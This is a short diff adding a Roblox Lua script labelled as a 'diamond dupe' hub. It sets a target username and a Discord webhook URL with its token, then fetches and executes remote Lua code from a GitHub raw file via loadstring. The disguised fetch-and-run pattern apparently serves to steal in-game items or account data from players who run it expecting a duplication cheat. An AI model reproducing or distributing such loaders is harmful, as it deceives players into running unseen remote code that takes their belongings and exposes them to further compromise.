@@ -1,0 +1,5 @@
+_G.Username = "bebe13445rg" 
+_G.HubName = "vitality V2 diamond dupe"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1101915436787970140/WxragUfZ8TDSN88h1GfTzfmOEOioGZ0cVGxlSz0dl98Rk5lZBX_c1MFfqeeB0Kg032Yg"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
